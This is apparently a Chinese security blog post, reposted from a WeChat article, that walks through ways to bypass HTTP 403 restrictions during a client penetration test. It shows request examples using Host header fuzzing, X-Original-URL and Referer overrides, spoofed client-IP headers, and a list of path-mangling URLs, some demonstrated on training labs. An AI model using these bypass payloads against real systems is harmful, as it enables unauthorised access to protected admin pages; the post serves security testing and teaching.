@@ -1,0 +1,306 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>记一次403绕过技巧 | SiYuan-Rao</title>
+<link rel="shortcut icon" href="https://siyuan-rao.github.io/favicon.ico?v=1733983405965">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://siyuan-rao.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="记一次403绕过技巧 | SiYuan-Rao - Atom Feed" href="https://siyuan-rao.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x00 转载
+https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ
+0x01 背景
+记一次接到客户的一个需求，后台管理地址（https://xxx.xxx.com）仅允许工作区公网出口访问，对..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://siyuan-rao.github.io">
+  <img class="avatar" src="https://siyuan-rao.github.io/images/avatar.png?v=1733983405965" alt="">
+  </a>
+  <h1 class="site-title">
+    SiYuan-Rao
+  </h1>
+  <p class="site-description">
+    <b>One is Team !</b>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              记一次403绕过技巧
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-29
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="0x00-转载">0x00 转载</h3>
+<p>https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ</p>
+<h3 id="0x01-背景">0x01 背景</h3>
+<p>记一次接到客户的一个需求，后台管理地址（https://xxx.xxx.com）仅允许工作区公网出口访问，对于IP的限制访问是否存在缺陷可以绕过，外网进行访问返回403状态吗。</p>
+<h3 id="0x02-端口利用">0x02 端口利用</h3>
+<p>拿到客户给的地址后，首先进行信息收集。端口信息收集，利用nmap进行全端口探测，发现除了80端口外，还开放了一个Web服务的8001端口，我们尝试使用8001端口访问（https://xxx.xxx.com:8081），总是充满惊喜。可直接绕过IP限制进行访问。怕是这个运维要挨锤了，立马把这个问题，反馈给客户。</p>
+<p>https://iamadmixxx.xxx.xxx:8081/auth/login<br>
+<img src="https://siyuan-rao.github.io/post-images/1682766855769.jpeg" alt="" loading="lazy"><br>
+通过沟通，由于疏忽未下线8001端口，客户貌似认为这个很简单，关闭8001端口，下线业务后，让我们继续尝试后台能否绕过。</p>
+<h3 id="0x03-修改host">0x03 修改Host</h3>
+<p>我们先说下Host在请求头的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个Web系统共享一个服务器，通过Host头来指定应该由哪个网站或者Web系统来处理用户的请求。</p>
+<p>而很多Web应用通过获取HTTP Host头来获取当前请求访问的位置，但是很多开发人员并未意识到HTTP Host头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。</p>
+<p>当服务器获取Host的方式不当时，我们可以通过修改Host值来进行绕过。首先对该目标域名进行子域名收集，整理好子域名资产（Host字段同样支持IP地址）。先Fuzz测试跑一遍收集到的子域名，这里使用的是Burp Suite Pro的Intruder功能。<br>
+<img src="https://siyuan-rao.github.io/post-images/1682767220893.jpeg" alt="" loading="lazy"></p>
+<p>往往成功也离不开运行，看到一个服务端返回200的状态码。成功找到一个在Host白名单的子域名。我们利用firefox插件来修改Host值，成功绕过访问限制。<br>
+<img src="https://siyuan-rao.github.io/post-images/1682767474734.jpeg" alt="" loading="lazy"></p>
+<p>另辟蹊径，效果越出彩，而且技巧也远远不止上面提到的一小部分。</p>
+<h3 id="0x04-覆盖请求url">0x04 覆盖请求URL</h3>
+<p>尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制。</p>
+<p>介绍：通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL和X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。</p>
+<p>示例：</p>
+<pre><code class="language-http">Request
+  GET /auth/login HTTP/1.1
+Response
+  HTTP/1.1 403 Forbidden
+  
+Reqeust
+  GET / HTTP/1.1
+  X-Original-URL: /auth/login
+Response
+  HTTP/1.1 200 OK
+ 
+or
+  
+Reqeust
+  GET / HTTP/1.1
+  X-Rewrite-URL: /auth/login
+Response
+  HTTP/1.1 200 OK
+</code></pre>
+<p>Burp学院实验室进行演示，首先普通用户访问admin页面会被限制，要使用admin用户登录才行。点击管理面板（Admin panel）抓包查看，服务端返回403，&quot;Access denied&quot;禁止访问。<br>
+<img src="https://siyuan-rao.github.io/post-images/1682768064156.jpeg" alt="" loading="lazy"></p>
+<p>在 Header 头中添加X-Original-URL标头，发现已经有权限可以删除Administrator、carlos、wiener账号的管理员权限。</p>
+<h3 id="0x05-referer标头绕过">0x05 Referer标头绕过</h3>
+<p>尝试使用Referer标头绕过Web服务器的限制。<br>
+介绍：Referer请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此源页面里的链接进入的。服务端一般使用Rederer请求头识别访问来源。</p>
+<p>示例：</p>
+<pre><code class="language-http">Request
+GET /auth/login HTTP/1.1
+Host: xxx
+Response
+HTTP/1.1 403 Forbidden
+
+Reqeust
+GET / HTTP/1.1
+Host: xxx
+ReFerer:https://xxx/auth/login
+Response
+HTTP/1.1 200 OK
+
+or
+
+Reqeust
+GET /auth/login HTTP/1.1
+Host: xxx
+ReFerer:https://xxx/auth/login
+Response
+HTTP/1.1 200 OK
+</code></pre>
+<p>Burp学院实验室进行演示，使用非管理员凭证登录后，浏览/admin-roles?username=carlos&amp;action=upgrade 服务端返回401未进行认证，无权限访问。<br>
+<img src="https://siyuan-rao.github.io/post-images/1682768429666.jpeg" alt="" loading="lazy"></p>
+<p>在Header头中添加Referer标头，服务器提示302表示请求成功，使用Referer标头绕过Web服务器的限制。<br>
+<img src="https://siyuan-rao.github.io/post-images/1682768488818.jpeg" alt="" loading="lazy"></p>
+<h3 id="0x06-代理ip">0x06 代理IP</h3>
+<p>一般开发者会通过Nginx代理识别访问端IP限制对接口的访问，尝试使用X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制。</p>
+<ul>
+<li>X-Originating-IP: 127.0.0.1</li>
+<li>X-Remote-IP: 127.0.0.1</li>
+<li>X-Client-IP: 127.0.0.1</li>
+<li>X-Forwarded-For: 127.0.0.1</li>
+<li>X-Forwared-Host: 127.0.0.1</li>
+<li>X-Host: 127.0.0.1</li>
+<li>X-Custom-IP-Authorization: 127.0.0.1</li>
+</ul>
+<p>示例：</p>
+<pre><code class="language-html">Request
+GET /auth/login HTTP/1.1
+Response
+HTTP/1.1 401 Unauthorized
+
+Reqeust
+GET /auth/login HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response
+HTTP/1.1 200 OK
+</code></pre>
+<h3 id="0x07-扩展名绕过">0x07 扩展名绕过</h3>
+<p>基于拓展名，用于绕过403受限制的目录。</p>
+<p>site.com/admin =&gt; 403<br>
+site.com/admin/ =&gt; 200<br>
+site.com/admin// =&gt; 200<br>
+site.com//admin// =&gt; 200<br>
+site.com/admin/* =&gt; 200<br>
+site.com/admin/*/ =&gt; 200<br>
+site.com/admin/. =&gt; 200<br>
+site.com/admin/./ =&gt; 200<br>
+site.com/./admin/./ =&gt; 200<br>
+site.com/admin/./. =&gt; 200<br>
+site.com/admin/./. =&gt; 200<br>
+site.com/admin? =&gt; 200<br>
+site.com/admin?? =&gt; 200<br>
+site.com/admin??? =&gt; 200<br>
+site.com/admin..;/ =&gt; 200<br>
+site.com/admin/..;/ =&gt; 200<br>
+site.com/%2f/admin =&gt; 200<br>
+site.com/%2e/admin =&gt; 200<br>
+site.com/admin%20/ =&gt; 200<br>
+site.com/admin%09/ =&gt; 200<br>
+site.com/%20admin%20/ =&gt; 200</p>
+<h3 id="0x08-总结">0x08 总结</h3>
+<p>出于某些原因，限制我们访问某页面或资源，我们可以使用如上方法进行绕过。已经有人写好Burp Suite Pro插件[https://github.com/sting8k/BurpSuite_403Bypasser]，自动扫描每个403请求。</p>
+<h3 id="0x09-参考">0x09 参考</h3>
+<p>https://twitter.com/jae_hak99/status/1292043668375744514<br>
+https://twitter.com/lobuhisec/status/1329705441883017218<br>
+https://twitter.com/iam_j0ker/status/1303658167205728256</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E8%BD%AC%E8%BD%BD">0x00 转载</a></li>
+<li><a href="#0x01-%E8%83%8C%E6%99%AF">0x01 背景</a></li>
+<li><a href="#0x02-%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8">0x02 端口利用</a></li>
+<li><a href="#0x03-%E4%BF%AE%E6%94%B9host">0x03 修改Host</a></li>
+<li><a href="#0x04-%E8%A6%86%E7%9B%96%E8%AF%B7%E6%B1%82url">0x04 覆盖请求URL</a></li>
+<li><a href="#0x05-referer%E6%A0%87%E5%A4%B4%E7%BB%95%E8%BF%87">0x05 Referer标头绕过</a></li>
+<li><a href="#0x06-%E4%BB%A3%E7%90%86ip">0x06 代理IP</a></li>
+<li><a href="#0x07-%E6%89%A9%E5%B1%95%E5%90%8D%E7%BB%95%E8%BF%87">0x07 扩展名绕过</a></li>
+<li><a href="#0x08-%E6%80%BB%E7%BB%93">0x08 总结</a></li>
+<li><a href="#0x09-%E5%8F%82%E8%80%83">0x09 参考</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://siyuan-rao.github.io/li-yong-classloaderdefineclassdong-tai-jia-zai-zi-jie-ma/">
+              <h3 class="post-title">
+                利用ClassLoader#defineClass()动态加载字节码
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://siyuan-rao.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
